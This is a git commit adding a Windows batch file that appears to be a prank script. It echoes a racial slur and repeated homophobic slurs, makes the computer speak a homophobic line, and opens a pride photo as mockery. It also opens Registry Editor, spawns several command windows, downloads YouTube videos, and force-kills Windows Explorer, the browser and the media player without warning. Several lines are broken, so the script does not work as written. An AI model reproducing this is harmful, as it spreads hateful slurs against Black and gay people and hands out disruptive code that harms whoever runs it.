7393583a755798eb11978d38f02d83822b3c5f0e
MailaAbendan <abendan.maila16@gmail.com>
2025-05-24 17:56:58 +0800

    Add files via upload

---
+++ WAIIU.bat
@@ -0,0 +1,43 @@
+@echo off
+title WAIIU
+color 03
+echo Hi I'm WAIIU
+pause >nul
+echo NIGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+pause >nul
+echo HAHA YEAH BOIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+pause >nul
+cd Desktop
+yt-dlp https://youtu.be/2_Ur5IjW_c8?list=TLPQMjQwNTIwMjXZ6HLUpjsUhg & "C:\Users\Maila\Desktop\Shapeshifter AMONG US! (2023 FGTeeV Fam Roles Gameplay).mp4"
+"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Administrative Tools\Registry Editor.lnk"
+start cmd
+start https://www.youtube.com/watch?v=2_Ur5IjW_c8&list=TLPQMjQwNTIwMjXZ6HLUpjsUhg&index=1
+cd Desktop
+yt-dlp https://youtu.be/Ee_uujKuJMI & "C:\Users\Maila\Desktop\Green Day - American Idiot [Official Music Video] [4K Upgrade].mp4"
+start cmd
+@echo off
+title YEAH BOIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+color 03
+echo YEAH BOIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+echo BIIIIIIIIIIIIIIIIIIIIIIIITCH RICH I'M RICH AND YOUR POOR
+start cmd
+title I DON'T CARE
+echo KISS ME I'M MALE
+start https://upload.wikimedia.org/wikipedia/commons/thumb/d/d1/TwoMenKiss.GayPrideParade.WDC.10June2017.jpg/960px-TwoMenKiss.GayPrideParade.WDC.10June2017.jpg
+if exist speech.Vbs del speech.Vbs
+echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "speech.Vbs"
+set "GAY GAY GAY GAY GAY GAY GAY GAY COMPUTER EWWWWWWWWWWWWWWWWWWWWWWWWWWWWW"
+echo speech.speak "%text%" >> "speech.vbs"
+start speech.vbs
+timeout 5 >nul
+del speech.Vbs
+start cmd
+echo off
+title FAGGOT
+echo FAGGOT FAGGOT FAGGOT FAGGOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOT
+pause >nul "Press any key to bruh!"
+@echo off
+taskkill /f /im speech.vbs
+taskkill /f /im explorer.exe  :: Closes Windows Explorer (use with caution!)
+taskkill /f /im wmplayer.exe  :: Closes video player if used
+taskkill /f /im msedge.exe  :: Closes browser (if it’s playing YouTube)
